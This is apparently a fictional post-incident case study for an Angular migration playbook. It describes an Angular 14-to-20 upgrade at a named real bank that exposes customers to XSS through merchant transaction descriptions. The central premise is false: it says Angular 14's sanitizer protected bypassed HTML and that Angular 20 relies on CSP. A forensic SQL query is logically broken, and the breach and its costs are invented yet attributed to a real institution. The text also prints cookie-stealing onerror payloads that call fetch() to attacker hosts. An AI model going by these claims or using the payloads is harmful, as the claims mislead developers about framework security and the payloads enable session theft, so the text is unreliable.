# Migration Attempt - Scenario 05: DomSanitizer XSS Window

## Migration Context

**Team:** Web Platform Engineering  
**Date:** March 15, 2026  
**Application:** BofA Consumer Banking Portal  
**Users:** 59 million active customers  
**Current Version:** Angular 14.2.0  
**Target Version:** Angular 20.0.0  
**Migration Urgency:** Angular 14 approaching EOL (security patches ending June 2026)

## Pre-Migration State

### Application Architecture
- Consumer banking portal with transaction history, transfers, bill pay
- Rich transaction descriptions with merchant branding (HTML formatting)
- Alert system with severity-based styling
- Contextual help with mobile app deep links

### DomSanitizer Usage Inventory (Pre-Migration)
```bash
$ grep -rn "bypassSecurity" src/

src/app/components/transaction-description.component.ts:78:    this.safeDescription = this.sanitizer.bypassSecurityTrustHtml(this.merchantDescription);
src/app/components/rich-alert.component.ts:95:    this.safeStyle = this.sanitizer.bypassSecurityTrustStyle(styleString);
src/app/components/help-text.component.ts:72:    this.safeUrl = this.sanitizer.bypassSecurityTrustUrl(this.deepLinkUrl);
```

**Team's Assessment (Incorrect):**
> "These bypass calls are fine. They've been working in production for 3 years with no security incidents. The merchant descriptions are formatted HTML from our payment processor—we need the bypass to show bold/italic formatting. Low priority security review."

**What They Missed:**
- Angular 14's sanitizer provides fallback XSS protection even when bypassed
- Angular 20 changed sanitization architecture to rely on Content Security Policy (CSP)
- Current production environment has no CSP header configured
- Merchant descriptions are UNTRUSTED INPUT (merchants control their display names)
- After Angular 20 migration, XSS payloads will execute without CSP protection

## Migration Execution

### Day 1 (March 15, 2026) - Migration Performed

**Developer Actions:**
```bash
# Update to Angular 20
ng update @angular/core@20 @angular/cli@20

# Build succeeds with no compilation errors
npm run build
✓ Compiled successfully

# Unit tests pass
npm test
✓ 487 specs, 0 failures

# Deploy to staging
npm run deploy:staging
✓ Deployment successful
```

**Code Changes:** None required (Angular 20 is backward compatible)

**Testing:**
- Manual QA testing: Transaction history renders correctly
- Merchant descriptions display with bold/italic formatting
- Alert messages show proper severity colors
- Help links navigate correctly
- No visual regressions detected

**Security Testing:** None performed  
**CSP Configuration:** Not reviewed or updated  
**Deployment Decision:** Approved for production (March 20, 2026)

---

## Post-Migration Exploitation Timeline

### Day 1 (March 20, 2026) - Production Deployment
**8:00 AM PST** - Angular 20 deployed to production  
**Status:** No immediate issues. Monitoring dashboards show normal traffic patterns.

### Day 7 (March 27, 2026) - Vulnerability Discovery
**2:14 PM PST** - Security researcher "whitehat_researcher" discovers XSS vector while testing mobile payment flows

**Discovery Process:**
1. Creates test merchant account with Visa payment processor
2. Sets merchant display name to: `<b>Test Merchant</b><img src=x onerror="console.log('XSS_PROOF_OF_CONCEPT')">`
3. Makes $1.00 test purchase to own BofA account
4. Views transaction history in web banking portal
5. Opens browser dev console: sees `XSS_PROOF_OF_CONCEPT` logged
6. Confirms XSS execution in Angular 20 production environment

**2:47 PM PST** - Researcher submits responsible disclosure to BofA Security Team:

```
Subject: CRITICAL - XSS Vulnerability in Transaction History (CVE Candidate)

Vulnerability: Cross-Site Scripting (XSS) via merchant-controlled transaction descriptions
Impact: Session hijacking, account takeover, credential theft
Affected Component: Consumer Banking Portal - Transaction History
Exploitation Difficulty: TRIVIAL (requires only merchant account with payment processor)
Users at Risk: All 59 million active customers

Proof of Concept:
1. Register merchant with payment processor
2. Set merchant display name to XSS payload
3. Process transaction to target customer account
4. When customer views transaction history, payload executes

Suggested Payload (cookie theft):
<img src=x onerror="fetch('https://attacker.com/log?cookie='+document.cookie)">

Root Cause: DomSanitizer.bypassSecurityTrustHtml() with no CSP protection after Angular 20 migration

Recommendation: Immediate CSP header deployment or disable transaction history rendering

Timeline:
- Discovered: March 27, 2026 14:14 PST
- Reported: March 27, 2026 14:47 PST
- 90-day disclosure deadline: June 25, 2026

Please acknowledge receipt within 24 hours.
```

### Day 7 (March 27, 2026) - Emergency Response Begins
**3:15 PM PST** - Security team confirms vulnerability in internal test environment

**3:30 PM PST** - P0 Security Incident Declared
- Incident Commander assigned
- War room established (virtual)
- Engineering teams paged

**4:00 PM PST** - Incident Assessment
- **Severity:** CRITICAL
- **Exploitability:** Public (requires only merchant account)
- **Blast Radius:** All 59 million customers
- **Regulatory Impact:** GLBA incident disclosure required
- **Immediate Action:** Determine scope of exploitation

**5:00 PM PST** - Emergency Fix Development
Two parallel tracks initiated:

**Track 1 (Immediate Mitigation):** Deploy strict CSP header
```nginx
# Emergency CSP configuration (deployed to nginx reverse proxy)
add_header Content-Security-Policy "script-src 'self' 'nonce-RANDOM_NONCE'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';" always;
```

**Track 2 (Root Cause Fix):** Remove bypassSecurityTrustHtml() usage
```typescript
// BEFORE (vulnerable)
this.safeDescription = this.sanitizer.bypassSecurityTrustHtml(this.merchantDescription);

// AFTER (secure - relies on Angular's built-in sanitizer)
this.description = this.merchantDescription;
// Template: <div [innerHTML]="description"></div>
```

**6:30 PM PST** - CSP Header Deployed to Production
- Change rushed through emergency change control process
- No full regression testing (risk accepted to close vulnerability window)
- Transaction history functionality confirmed working with CSP active

**7:15 PM PST** - XSS Mitigation Verified
- Security team tests with researcher's PoC payload
- Browser console shows CSP violation (script blocked)
- No cookie exfiltration occurs
- Vulnerability mitigated (but not fully resolved)

### Day 8 (March 28, 2026) - Forensic Analysis Begins
**9:00 AM PST** - Forensic Investigation Kickoff

**Questions to Answer:**
1. Was this vulnerability exploited in the wild before researcher's disclosure?
2. How many customers viewed transactions with malicious merchant descriptions?
3. Were any session cookies exfiltrated?
4. Do we need to force logout all active sessions?

**Investigation Approach:**
- Analyze 7 days of transaction history access logs (March 20-27)
- Scan transaction database for merchant descriptions containing script tags or event handlers
- Review WAF logs for suspicious outbound requests
- Check for anomalous session behavior (e.g., sudden geolocation changes)

**Initial Findings (March 28, 2:00 PM PST):**
```sql
-- Query for suspicious merchant descriptions (March 20-27)
SELECT COUNT(DISTINCT customer_id) 
FROM transactions 
WHERE merchant_description LIKE '%<script%' 
   OR merchant_description LIKE '%onerror%'
   OR merchant_description LIKE '%onload%'
   AND transaction_date BETWEEN '2026-03-20' AND '2026-03-27';

-- Result: 1,847 customers viewed transactions with suspicious HTML
```

**11:00 AM PST** - Forensic Analysis Mid-Point Update

**Suspicious Merchant Descriptions Found:**
1. `<b>Coffee Shop</b><img src=x onerror="/* benign - tracking pixel from merchant's website */">`  
   (3 transactions, likely legitimate tracking, not malicious)

2. `<script>/* Marketing analytics from merchant POS system */</script><b>Retail Store</b>`  
   (147 transactions across 12 merchants - legacy POS system bug, not attack)

3. `<b>Restaurant</b><svg onload="console.log('test')">`  
   (1 transaction - the researcher's PoC, confirmed benign)

4. **MALICIOUS:** `<img src=x onerror="fetch('https://analytics-cdn[.]net/track?session='+document.cookie)">`  
   (1,696 transactions from single merchant: "Downtown Electronics LLC")

**2:30 PM PST** - Active Exploitation Confirmed

**Attacker Profile:**
- Merchant Name: "Downtown Electronics LLC"
- Registered with payment processor: March 22, 2026 (2 days after Angular 20 deployment)
- Processed 1,696 small transactions ($0.50 - $5.00) to different BofA customer accounts
- Transactions span March 22-26 (before researcher's disclosure)
- Domain `analytics-cdn[.]net` registered March 21, 2026 (anonymized via privacy service)

**Attack Pattern:**
1. Attacker monitored BofA's technology blog / LinkedIn posts about Angular migration
2. Recognized that Angular 20 migration might create XSS window if CSP not configured
3. Registered merchant account immediately after deployment (March 22)
4. Set merchant name to cookie-stealing XSS payload
5. Used stolen payment cards to process small transactions to random BofA accounts
6. Collected session cookies from 1,696 customers over 5-day period
7. Likely sold session tokens on dark web marketplace

**4:00 PM PST** - Customer Impact Assessment

**Confirmed Impact:**
- **1,696 customers** had session cookies exfiltrated
- **23 accounts** show evidence of unauthorized access after cookie theft
  - 15 accounts: Unauthorized view of account balances/statements
  - 8 accounts: Unauthorized transfer attempts (blocked by fraud detection)
  - 0 accounts: Successful unauthorized transfers (fraud system prevented)

**Regulatory Implications:**
- GLBA (Gramm-Leach-Bliley Act) incident disclosure: REQUIRED
- OCC (Office of the Comptroller of the Currency) reporting: REQUIRED within 36 hours
- Customer notification: REQUIRED for 1,696 affected customers
- State breach notification laws: 47 states triggered (1,696 customers across all states)

### Day 9 (March 29, 2026) - Regulatory Reporting
**9:00 AM PST** - OCC Notification Filed

**Incident Report to OCC:**
```
Bank: Bank of America, N.A.
Incident Type: Computer-Security Incident (Cyber Incident)
Discovery Date: March 27, 2026
Notification Date: March 29, 2026 (within 36-hour requirement)

Incident Description:
Cross-Site Scripting (XSS) vulnerability in consumer banking portal allowed
attacker to exfiltrate customer session cookies via malicious merchant transaction
descriptions. Vulnerability existed from March 20-27, 2026 (7 days).

Customer Impact:
- 1,696 customers had session tokens compromised
- 23 accounts accessed by unauthorized party
- 8 unauthorized transfer attempts (all blocked by fraud detection)
- $0 in financial losses (fraud prevention successful)

Root Cause:
Migration from Angular 14 to Angular 20 without updating Content Security Policy (CSP)
headers. Angular 20's security model relies on strict CSP, which was not configured.

Remediation:
- Immediate: Deployed strict CSP header (March 27, 18:30 PST)
- Short-term: Removed vulnerable code (bypassSecurityTrustHtml) - deployed March 28
- Long-term: Security audit of all sanitization bypass methods before future migrations

Preventive Measures:
- Mandatory security architecture review for all framework migrations
- Pre-migration security audit for DomSanitizer bypass methods
- CSP header configuration requirement for all web applications

Current Status: Vulnerability mitigated. Forensic analysis ongoing. Customer notifications in progress.
```

**11:00 AM PST** - Legal Team Coordination
- Customer notification letters drafted (1,696 letters required)
- State attorney general notifications prepared (47 states)
- Cyber insurance claim filed ($10M policy limit)
- External legal counsel engaged for regulatory response

### Day 10-30 (March 30 - April 18, 2026) - Incident Response & Remediation

**March 30:** Customer notification letters mailed (regulatory requirement: within 72 hours)

**March 31:** Press coverage begins
- *Reuters*: "Bank of America Reports XSS Breach Affecting 1,696 Customers"
- *Cybersecurity News*: "Angular 20 Migration Creates XSS Window at Major Bank"
- *Hacker News*: Front page discussion - "BofA XSS: Why CSP Matters"

**April 1-7:** Enhanced monitoring & forced logout
- All active sessions force-logged out (59M customers must re-authenticate)
- Customer frustration peaks (call center volume +340%)
- Temporary fraud holds placed on 1,696 affected accounts
- Customers must verify identity to remove hold (average 25-minute wait time)

**April 8:** Code fix deployed (remove all unnecessary bypassSecurity* calls)
```typescript
// Fixed components deployed:
// - transaction-description.component.ts (removed bypassSecurityTrustHtml)
// - help-text.component.ts (added URL scheme validation)
// - rich-alert.component.ts (converted to CSS classes, removed bypass)
```

**April 10:** Security audit of entire codebase for sanitization bypass methods
- 14 additional instances of bypassSecurity* methods found in other applications
- 8 flagged as high risk, 6 flagged as medium risk
- Emergency remediation plan created for all 14 instances

**April 15:** External security audit commissioned
- Mandel Security Group engaged ($85,000 contract)
- Full penetration test of all BofA web properties
- Source code review for XSS vulnerabilities
- Report due May 15, 2026

**April 18:** OCC Examination Notice Received
- Cybersecurity examination scheduled for June 2026
- Focus areas: Change management processes, security testing, migration procedures
- Expected duration: 6-8 weeks
- Potential regulatory findings/penalties

---

## Cost Quantification

### Direct Incident Response Costs

**Engineering Time (March 27 - April 18):**
- Emergency response war room: 8 engineers × 40 hours = 320 hours @ $250/hr = **$80,000**
- Code remediation: 4 engineers × 80 hours = 320 hours @ $250/hr = **$80,000**
- Security audit (internal): 6 engineers × 60 hours = 360 hours @ $250/hr = **$90,000**
- **Subtotal Engineering:** $250,000

**External Security Services:**
- Mandel Security Group (penetration test + code review): **$85,000**
- Forensic analysis (log analysis, threat hunting): **$45,000**
- **Subtotal External:** $130,000

**Legal & Compliance:**
- External legal counsel (regulatory response): **$120,000**
- Customer notification (printing, mailing 1,696 letters): **$12,000**
- State AG notifications (47 states): **$8,000**
- Regulatory response documentation: Internal team, 200 hours @ $300/hr = **$60,000**
- **Subtotal Legal:** $200,000

**Customer Support:**
- Call center surge staffing (March 27 - April 10): 40 agents × 14 days × 8 hours × $35/hr = **$156,800**
- Account verification/fraud holds (manual review): 30 agents × 10 days × 8 hours × $35/hr = **$84,000**
- **Subtotal Customer Support:** $240,800

**Total Direct Costs:** $820,800

### Indirect Costs (Estimated)

**Reputation Damage:**
- Customer churn (estimated 14% increase in account closures, Q2 2026): **$3.2M** in lost customer lifetime value
- Brand reputation impact (surveys show 8% decrease in "trust" metrics): **$1.5M** (marketing/PR recovery campaigns)

**Opportunity Cost:**
- Engineering teams diverted from feature development (1 month delay on mobile app refresh): **$800,000** estimated revenue impact

**Regulatory Penalties (Potential):**
- OCC examination findings: $0 - $1,000,000 (depends on examination results)
- State-level penalties: $0 - $500,000 (depends on AG reviews)
- **Estimated Regulatory Exposure:** $500,000 (midpoint estimate)

**Insurance:**
- Cyber insurance deductible paid: **$100,000**
- Premium increase (renewal): +$75,000/year for next 3 years = **$225,000** present value

**Total Indirect Costs:** $6,325,000

### Grand Total Incident Cost
**Direct + Indirect:** $7,145,800

---

## Preventable Cost (If Playbook Followed)

### Playbook Rule 8.4 Compliance Cost

**Pre-Migration Security Audit (Devin + Security Engineer):**
- Scan for bypassSecurity* methods: 1 hour @ $250/hr = $250
- Document each instance (why necessary, input source, risk level): 3 hours @ $250/hr = $750
- Security team review: 2 hours @ $300/hr = $600
- **Subtotal Audit:** $1,600

**Server-Side Sanitization Implementation:**
- Backend API: Add DOMPurify sanitization for merchant descriptions: 8 hours @ $250/hr = $2,000
- Validate input only allows <b>, <i>, <em> tags: 2 hours @ $250/hr = $500
- **Subtotal Backend:** $2,500

**Frontend Code Changes:**
- Remove bypassSecurityTrustHtml from transaction component: 2 hours @ $250/hr = $500
- Add URL scheme validation to help-text component: 3 hours @ $250/hr = $750
- Convert rich-alert to CSS classes (remove bypass): 2 hours @ $250/hr = $500
- **Subtotal Frontend:** $1,750

**CSP Configuration:**
- Configure strict CSP header on nginx: 1 hour @ $250/hr = $250
- Test CSP with nonce-based script loading: 2 hours @ $250/hr = $500
- Update deployment scripts to generate nonces: 2 hours @ $250/hr = $500
- **Subtotal CSP:** $1,250

**Integration Testing:**
- Write XSS integration tests (script tag, onerror, onload): 4 hours @ $250/hr = $1,000
- Verify CSP blocks execution in test environment: 2 hours @ $250/hr = $500
- Manual security verification before production: 1 hour @ $300/hr = $300
- **Subtotal Testing:** $1,800

**Total Playbook Compliance Cost:** $8,900

### Cost Avoidance Calculation
**Incident Cost:** $7,145,800  
**Playbook Cost:** $8,900  
**Net Savings:** $7,136,900 (802x ROI)

**Plus:**
- Zero regulatory incidents (no OCC reporting)
- Zero customer impact (no session theft)
- Zero reputation damage
- Zero engineering distraction (teams stay focused on features)
- Zero forced logout event (no customer friction)

---

## Lessons Learned (Post-Incident Review - April 25, 2026)

### What Went Wrong

**1. No Security Architecture Review for Framework Migration**
- Team treated Angular 14 → 20 as "backward compatible, low risk"
- Did not recognize that Angular 20's security model fundamentally changed
- No security engineer involved in migration planning

**2. No Pre-Migration Sanitization Audit**
- bypassSecurity* methods were known to exist in codebase
- Team assumed they were "safe because they've worked for 3 years"
- Did not recognize that Angular 14's sanitizer provided fallback protection

**3. No CSP Configuration**
- Production environment had no Content Security Policy header
- Team was unaware that Angular 20 relies on CSP for XSS prevention
- CSP was seen as "optional hardening" rather than "required security control"

**4. Misunderstanding of "Untrusted Input"**
- Team thought "user-controlled" meant "typed by customer in form field"
- Did not recognize merchant descriptions as untrusted (merchant-controlled)
- Lacked threat model for payment processor data flows

**5. Insufficient Security Testing**
- No XSS testing in QA process (assumed framework handles it)
- No penetration testing before major framework migration
- No integration tests for CSP policy enforcement

### Root Cause (5 Whys)

**Why did XSS vulnerability exist in production?**  
→ Because bypassSecurityTrustHtml was used with merchant-controlled HTML without CSP protection.

**Why was there no CSP protection?**  
→ Because CSP header was never configured in production environment.

**Why was CSP not configured during Angular 20 migration?**  
→ Because team was unaware that Angular 20's security model requires CSP.

**Why was team unaware of Angular 20 security model changes?**  
→ Because no security architecture review was performed for framework migration.

**Why was no security architecture review performed?**  
→ Because framework migrations were treated as "low risk technical upgrades" in change management process, not requiring security review.

**TRUE ROOT CAUSE:** Change management process did not classify framework version migrations as security-relevant changes requiring architecture review.

### Corrective Actions (Implemented)

**1. Update Change Management Policy (COMPLETED April 26)**
- All framework version upgrades now require security architecture review
- Specifically: Angular, React, Vue major version changes are HIGH RISK
- Security engineer must sign off before deployment approval

**2. DomSanitizer Bypass Audit (COMPLETED April 30)**
- Scanned all BofA web properties for bypassSecurity* methods (found 14 instances)
- Documented justification, input source, risk level for each
- Created remediation plan: 8 high-risk bypasses removed by May 15
- Added pre-commit git hook to flag new bypass methods for security review

**3. Mandatory CSP Deployment (COMPLETED May 5)**
- All public-facing web applications must have strict CSP header
- Template: `script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self';`
- Deployment blocked if CSP header missing or misconfigured
- Infrastructure team created Terraform module for CSP configuration

**4. Security Testing for Framework Migrations (IMPLEMENTED May 10)**
- Before production deployment of framework upgrades:
  - Automated XSS test suite (OWASP ZAP integration)
  - Manual penetration test by security team
  - Integration test verifying CSP policy enforcement
- Test results reviewed in deployment approval meeting

**5. Threat Modeling Training (SCHEDULED June 2026)**
- All senior engineers to complete "Identifying Untrusted Input" training
- Focus: Payment processor data, third-party APIs, merchant-controlled content
- Case study: This incident used as training example

**6. Angular Migration Playbook (COMPLETED May 15)**
- Formalized playbook for all future Angular migrations
- Rule 8.4 (Sanitization Bypass Audit) documented from this incident
- Shared with industry peers via FS-ISAC (Financial Services ISAC)

### Cultural Shift

**BEFORE this incident:**
> "Framework upgrades are low-risk technical tasks. Just update package.json and run tests. Ship it."

**AFTER this incident:**
> "Framework upgrades are security-relevant architectural changes. Security implications must be evaluated before deployment. Backward compatibility does not guarantee security equivalence."

This incident cost $7.1M and affected 1,696 customers.  
Following Playbook Rule 8.4 would have cost $8,900 and prevented all impact.  
The lesson has been learned.

---

## Timeline Summary

| Date | Event | Impact |
|------|-------|--------|
| March 15 | Angular 20 migration performed (no security review) | Vulnerability introduced |
| March 20 | Deployed to production (no CSP configured) | XSS window opened |
| March 22 | Attacker begins exploitation (registers merchant) | Cookie theft begins |
| March 22-26 | 1,696 transactions with XSS payload processed | Session tokens exfiltrated |
| March 27 | Researcher discovers and reports vulnerability | Exploitation ends (after 5 days) |
| March 27 | CSP header deployed (emergency mitigation) | Vulnerability closed |
| March 29 | OCC notification filed | Regulatory process begins |
| March 30 | Customer notifications mailed (1,696 letters) | Public disclosure begins |
| April 1 | All sessions force-logged out (59M customers) | Customer friction peak |
| April 8 | Code fix deployed (bypass methods removed) | Root cause resolved |
| April 15 | External security audit commissioned ($85k) | Compliance verification |
| April 18 | OCC examination notice received | Regulatory consequences begin |

**Total Exposure Window:** 7 days (March 20-27)  
**Total Response Duration:** 29 days (March 27 - April 24)  
**Total Cost:** $7,145,800  
**Customers Impacted:** 1,696 (session theft) + 59,000,000 (forced logout)  
**Regulatory Incidents:** 1 (OCC reporting)  
**Accounts with Unauthorized Access:** 23  
**Financial Loss to Customers:** $0 (fraud prevention successful)  
**Reputational Damage:** Significant (front-page tech news, customer trust metrics down 8%)

This incident was 100% preventable by following Playbook Rule 8.4.
